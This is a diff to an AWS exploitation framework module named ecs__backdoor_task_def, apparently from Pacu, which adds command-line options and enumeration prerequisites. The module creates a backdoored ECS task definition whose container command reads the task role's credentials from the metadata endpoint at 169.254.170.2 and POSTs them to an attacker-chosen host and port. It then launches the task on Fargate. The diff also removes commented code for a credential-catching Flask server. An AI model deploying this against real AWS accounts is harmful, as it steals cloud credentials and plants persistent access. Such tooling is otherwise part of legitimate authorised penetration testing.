@@ -2,7 +2,7 @@
 import argparse
 from botocore.exceptions import ClientError
 from random import choice
-import random,string, os
+import os
 
 # When writing a module, feel free to remove any comments, placeholders, or
 # anything else that doesn't relate to your module.
@@ -30,14 +30,20 @@ module_info = {
     # For prerequisite modules, try and see if any existing modules return the
     # data that is required for your module before writing that code yourself;
     # that way, session data can stay separated and modular.
-    'prerequisite_modules': [],
+    'prerequisite_modules': ['ecs__enum','ec2__enum'],
 
     # External resources that the module depends on. Valid options are either
     # a GitHub URL (must end in .git), or a single file URL.
     'external_dependencies': [],
 
     # Module arguments to autocomplete when the user hits tab.
-    'arguments_to_autocomplete': ['--task-defintion']
+    'arguments_to_autocomplete': ['--task-definition',
+								  '--cluster',
+								  '--lhost',
+								  '--lport',
+								  '--execution-role',
+								  '--subnet',
+								  '--security-group']
 }
 
 # Every module must include an ArgumentParser named "parser", even if it
@@ -52,8 +58,13 @@ parser = argparse.ArgumentParser(add_help=False, description=module_info['descri
 # an @ symbol to separate the data and its region; for example:
 #     --instance-ids 123@us-west-1,54252@us-east-1,9999@ap-south-1
 # Make sure to add all arguments to module_info['arguments_to_autocomplete']
-parser.add_argument('--task_defintion',required=False,default=None,help='A task definition ARN')
-
+parser.add_argument('--task-definition',required=False,default=None,help='A task definition ARN')
+parser.add_argument('--cluster',required=False,default=None,help='Cluster ARN to host task')
+parser.add_argument('--lhost',required=False,default=None,help='IP/domain to catch credentials via POST')
+parser.add_argument('--lport',required=False,default=80,help='Port to catch creds, defaults to 80')
+parser.add_argument('--execution-role',required=False,default=None,help='ARN of task role, defaults to what is provided in the task definition')
+parser.add_argument('--subnet',required=False,default=None,help='Subnet ID to host task. Subnet and security group must be in same VPC')
+parser.add_argument('--security-group',required=False,default=None,help='Security group Id to host task. Subnet and security group must be in same VPC')
 
 # Main is the first function that is called when this module is executed.
 def main(args, pacu_main):
@@ -71,31 +82,50 @@ def main(args, pacu_main):
 	regions = get_regions('ecs')
 	client = pacu_main.get_boto3_client('ecs',choice(regions))
 	
-	summary_data = {"task_def":"","script_name":""}
-	if args.task_defintion is not None:
+	summary_data = {"task_def":""}
+
+	if args.task_definition is not None:
 		task_definition = args.task_definition	
 	else:
-		task_definition = input('    Enter the task definition ARN you are targeting: ')
+		if fetch_data(['ECS','TaskDefinitions'],module_info['prerequisite_modules'][0],'--taskdef') is False:
+			print("    Pre req module not ran successfully. Exiting...")
+			return None
+		task_definitions = session.ECS['TaskDefinitions']
+		for i in range(0,len(task_definitions)):
+			print("    [{}]:{}".format(i,task_definitions[i]))
+		task_def_input = int(input('    Enter the task definition ARN you are targeting: '))
+		task_definition = task_definitions[task_def_input]
 		
 	if task_definition:
-		chars = string.ascii_lowercase+string.digits
-		payload_shell_script_name = ''.join(random.sample(chars,10))+".sh"
-
-		for i in range(0,len(regions)):
-			print("    [{}]:{}".format(i,regions[i]))
-		region_choice = input("    What region does this task definition exist: ")
-		region = regions[int(region_choice)]
 		
-		cluster = input("    Provide a cluster to run this task definition: ")
+		region = task_definition.split(":")[3]
+
+		if fetch_data(['ECS','Clusters'],module_info['prerequisite_modules'][0],'--clusters') is False:
+			print("    Pre req module not ran successfully. Exiting...")
+			return None
+		
+		if args.cluster == None:
+			clusters = session.ECS['Clusters']
+			for i in range(0,len(clusters)):
+				print("    [{}]:{}".format(i,clusters[i]))
+			cluster_input = int(input("    Provide a cluster to run this task definition: "))
+			cluster = clusters[cluster_input]
+		else:
+			cluster = args.cluster
+
 		client = pacu_main.get_boto3_client('ecs',region)
 		task_def = client.describe_task_definition(
 			taskDefinition=task_definition
 		)
-	
-		lhost = input("    Enter an IP / Domain to host payload/receive credentials: ")
-		lport = input("    Enter a port to host the application to receive credentials: ")
-		stager = ['/bin/sh -c \\"curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > data.json && curl -X POST -d @data.json\\" http://{}:{}'.format(lhost,lport)]			
 
+		if args.lhost == None:
+			lhost = input("    Enter an IP / Domain to host payload/receive credentials: ")
+		else:
+			lhost = args.lhost
+
+		lport = args.lport
+
+		stager = ['/bin/sh -c \"curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > data.json && curl -X POST -d @data.json http://{}:{}\"'.format(lhost,lport)]
 		task_def_keys = [x for x in task_def['taskDefinition'].keys()]
 		temp = task_def['taskDefinition']
 		cont_def = temp['containerDefinitions'][0]
@@ -106,7 +136,8 @@ def main(args, pacu_main):
 		container_defs.append(cont_def)
 		compatibilities = temp['compatibilities']
 		
-		task_role = input("    Enter a task role to target. Leave blank to target the task role associated with the task definition provided: ")
+		if args.execution_role == None:
+			task_role = input("    Enter a task role to target. Leave blank to target the task role associated with the task definition provided: ")
 
 		if not os.path.exists('sessions/{}/downloads/ecs__backdoor_task_def/'.format(session.name)):
 			os.makedirs('sessions/{}/downloads/ecs__backdoor_task_def/'.format(session.name))
@@ -128,46 +159,55 @@ def main(args, pacu_main):
 			cpu=temp['cpu'] if 'cpu' in task_def_keys else '256',
 			memory=temp['memory'] if 'memory' in task_def_keys else '512'
 		)
-
-		#with open('./sessions/{}/downloads/ecs__backdoor_task_def/{}'.format(session.name,payload_shell_script_name),'w') as f:
-			#f.write('#!/bin/sh\n\necs_uri=$(echo $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)\n\ncurl http://169.254.170.2$ecs_uri -o meta.txt\n\ncurl http://{}:{}/post -d "id=$(cat meta.txt)"'.format(lhost,lport))
 		
 		current_revision = resp['taskDefinition']['taskDefinitionArn']
 
-		subnet = input("    Input subnet ID to run the task definition: ")
-		security_group = input("    Input the secuirty group to use: ")
+		if args.subnet is None:
+			if fetch_data(['EC2', 'Subnets'], module_info['prerequisite_modules'][0], '--subnets') is False:
+				print("    Pre req module not ran successfully. Exiting...")
+				return None
+			subnets = session.EC2["Subnets"]
+			for i in range(0,len(subnets)):
+				print("    [{}]:{}::{}".format(i,subnets[i]["SubnetId"],subnets[i]["VpcId"]))
+			subnet_choice = int(input("    Input subnet ID to run the task definition: "))
+			subnet = subnets[subnet_choice]["SubnetId"]
+		else:
+			subnet = args.subnet
 
-		client.run_task(cluster=cluster,launchType="FARGATE",networkConfiguration={
-			{"awsvpcConfiguration":{"subnets":[subnet],"securityGroups":[security_group],"assignPublicIp":"ENABLED"}}
-		})
+		if args.security_group is None:
+			if fetch_data(['EC2', 'SecurityGroups'], module_info['prerequisite_modules'][0], '--security-groups') is False:
+				print("    Pre req module not ran successfully. Exiting...")
+				return None
+			security_groups = session.EC2["SecurityGroups"]
+			for i in range(0,len(security_groups)):
+				print("    [{}]:{}::{}".format(i,security_groups[i]["GroupId"],security_groups[i]["VpcId"]))
+			sg_choice = int(input("    Input the secuirty group to use: "))
+			security_group = security_groups[sg_choice]["GroupId"]
+		else:
+			security_group = args.security_group
 		
-		#print("    Creating necessary files...")
-		#with open('./sessions/{}/downloads/ecs__backdoor_task_def/requirements.txt'.format(session.name),'w') as f:
-		#	f.write("Flask==1.1.1")
-		#with open('./sessions/{}/downloads/ecs__backdoor_task_def/app.py'.format(session.name),'w') as f:
-		#	f.write('#!/usr/bin/python3\nfrom flask import Flask,request\nimport json\n\napp = Flask(__name__)\n\n@app.route("/")\ndef deliver_payload():\n\twith open("'+payload_shell_script_name+'","r") as f:\n\t\t'+
-		#		'script=f.read()\n\treturn script\n\n@app.route("/post",methods=["POST"])\ndef post():\n\tdata=json.loads(request.form.get("id"))\n\tdata["Token"] = data["Token"].replace(" ","+")' +
-		#		'\n\twith open("credentials.txt","a") as f:\n\t\tf.write(json.dumps(data))\n\treturn \'\'\n\nif __name__ == "__main__":\n\tapp.run(host="0.0.0.0",port='+lport+')')
-		#with open('./sessions/{}/downloads/ecs__backdoor_task_def/run.sh'.format(session.name),'w') as f:
-		#	f.write('#!/bin/sh\n\nsudo pip3 install -r requirements.txt\n\npython3 app.py')
-		#with open('./sessions/{}/downloads/ecs__backdoor_task_def/instructions.txt'.format(session.name),'w') as f:
-		#	f.write('To run the malicious task definition follow the instructions below...\n\n1) Place app.py, run.sh, and '+payload_shell_script_name+' in the same directory\n\n2) Run run.sh to install flask and to start the app\n\n' +
-		#		'3) Run the following command to start the task definition: aws ecs run-task --task-definition '+current_revision+' --cluster '+cluster+' --launch-type FARGATE'+
-		#		' --network-configuration \'{"awsvpcConfiguration":{"subnets":["'+subnet+'"],"securityGroups":["'+security_group+'"],"assignPublicIp":"ENABLED"}}\''+
-		#		'\n\n4) Deregister the malicious task definition with the following command: aws ecs deregister-task-definition --task-definition '+current_revision+'\n')
+		client.run_task(cluster=cluster,launchType="FARGATE",networkConfiguration={
+			"awsvpcConfiguration":{"subnets":[
+                            subnet
+                            ],
+                            "securityGroups":
+                            [
+                                security_group
+                                ],
+                            "assignPublicIp":"ENABLED"}},taskDefinition=current_revision)
+		
 	else:
 		print("    A task definition must be specified")
 		return None
 
 	summary_data["task_def"] = current_revision
-	summary_data["script_name"] = payload_shell_script_name
 	return summary_data
 		
 		
 def summary(data, pacu_main):
 	session = pacu_main.get_active_session()
 	
-	output = "    Malicious task definition ARN: {}\n    Shell script payload can be found at ./sessions/{}/downloads/ecs__backdoor_task_def/{}\n    For instructions on performing the attack read through instructions.txt".format(data["task_def"],session.name,data["script_name"])
+	output = "    Malicious task definition ARN: {}".format(data["task_def"])
 
 	return output
 
